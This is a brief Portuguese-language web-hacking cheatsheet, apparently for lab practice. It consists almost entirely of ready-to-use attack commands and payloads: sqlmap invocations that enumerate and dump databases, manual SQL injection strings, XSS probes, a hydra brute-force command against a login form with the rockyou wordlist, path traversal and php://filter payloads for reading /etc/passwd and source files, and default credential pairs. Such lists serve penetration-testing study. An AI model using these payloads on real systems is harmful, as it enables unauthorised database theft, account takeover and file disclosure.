# Cheatsheet — Hacking Web

## SQL Injection
sqlmap -u "http://alvo/page.php?id=1" --dbs
sqlmap -u "http://alvo/page.php?id=1" -D nome_db --tables
sqlmap -u "http://alvo/page.php?id=1" --dump
# Manual: ' OR '1'='1  /  ' UNION SELECT 1,2,3 -- -

## XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>

## Brute force (login)
hydra -l admin -P /usr/share/wordlists/rockyou.txt alvo http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

## Burp Suite
# Proxy 127.0.0.1:8080 -> Intercept -> modify -> Forward
# Use Repeater para mandar requests repetidos e estudar respostas

## LFI / Path Traversal
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index

## Credenciais comuns para labs
admin:admin  /  admin:password  /  root:root
